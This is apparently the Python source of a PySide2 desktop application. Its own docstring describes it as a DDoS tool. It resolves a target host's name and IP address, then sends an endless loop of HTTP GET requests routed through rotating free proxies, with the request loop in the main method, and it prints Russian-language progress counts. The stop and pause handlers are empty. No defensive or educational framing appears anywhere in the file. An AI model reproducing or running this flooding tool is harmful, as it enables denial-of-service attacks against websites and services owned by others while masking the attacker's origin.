import socket
import sys

import fake_proxy as f_p
import requests as req
from PySide2 import QtCore
from PySide2 import QtWidgets

import design
import dialog_design
import error


# from PySide2 import QtGui

def responser(a, p):
	"""
	check response from server
	:param a: URL address;
	:param p: proxy for requests;
	:return: bool value from response;
	"""
	response = req.get(a, proxies = p)
	return True if response.status_code == 200 else False


class MainApp(QtWidgets.QMainWindow, design.Ui_MainWindow):
	ip = None
	hostname = None
	global errors
	def __init__(self):
		"""
		Definition of interface
		:return: None;
		"""
		super().__init__()
		self.setupUi(self)
		self.start_button.clicked.connect(self.main)
		self.stop_button.clicked.connect(self.stop)
		self.pause_continue_button.clicked.connect(self.continues)
		self.check_button.clicked.connect(self.checker)
		self.start_button.setDisabled(True)
		self.stop_button.setDisabled(True)
		self.pause_continue_button.setDisabled(True)

	def main(self):
		"""
		Main function in application;
		Performs a DDOS attack on the target host;
		:return: None;
		"""
		global ip, hostname
		if self.URL_address.text() != hostname or self.IP_address.text() != ip:
			self.start_button.setDisabled(True)
			self.check_button.setEnabled(True)
			return False
		""" Requests"""
		intermediate_value = self.URL_address.text()
		k = 1
		if 'https://' not in intermediate_value:
			address = 'https://' + intermediate_value
		while True:
			try:
				proxy = f_p.get(proxy_type = 'https')[0]
				if responser(address, proxy):
					print(address,  'Всё прошло успешно, попытка №{}\r'.format(k), end = '\r')
					k += 1
					continue
				else:
					break
			except req.ConnectionError:
				address = 'http://' + intermediate_value
				try:
					proxy = f_p.get(proxy_type = 'http')[0]
					responser(address, proxy)
				except req.ConnectionError:
					############ message about connection is failed ###################################
					pass
			except ConnectionError:
				print('Ошибка соединения\r')

	def checker(self):
		self.check_button.setEnabled(True)
		self.start_button.setDisabled(True)
		self.stop_button.setDisabled(True)
		self.pause_continue_button.setDisabled(True)
		if self.get_host_name():
			self.start_button.setEnabled(True)
			self.check_button.setDisabled(True)
		if self.get_ip_address():
			self.start_button.setEnabled(True)
			self.check_button.setDisabled(True)

	def get_ip_address(self):
		global ip
		try:
			ip = socket.gethostbyname(self.URL_address.text())
			if ip == '0.0.0.0':
				errors.show()
				self.hide()
				return False
			self.IP_address.setText(ip)
			return ip
		except socket.gaierror:
			errors.show()
			self.hide()
			return False

	def get_host_name(self):
		global hostname
		try:
			if self.IP_address.text() == '':
				errors.show()
				self.hide()
				return False
			hostname = socket.gethostbyaddr(self.IP_address.text())[0]
			self.URL_address.setText(hostname)
			return hostname
		except socket.herror:
			errors.show()
			self.hide()
			return False

	def stop(self):
		pass

	def continues(self):
		pass


class FirstWindow(QtWidgets.QDialog, dialog_design.Ui_MainWindow):
	def __init__(self):
		super().__init__()
		self.setupUi(self)
		self.welcome_button.clicked.connect(self.hiding)
		self.setWindowFlags(QtCore.Qt.FramelessWindowHint)

	@staticmethod
	def hiding():
		my_main_window.show()
		welcoming.destroy()


class Errors(QtWidgets.QDialog, error.Ui_error_window):
	def __init__(self):
		super().__init__()
		self.setupUi(self)
		self.ok_button.clicked.connect(self.close)

	def close(self):
		self.hide()
		my_main_window.show()


if __name__ == '__main__':
	app = QtWidgets.QApplication()
	welcoming = FirstWindow()
	my_main_window = MainApp()
	errors = Errors()
	welcoming.show()
	sys.exit(app.exec_())
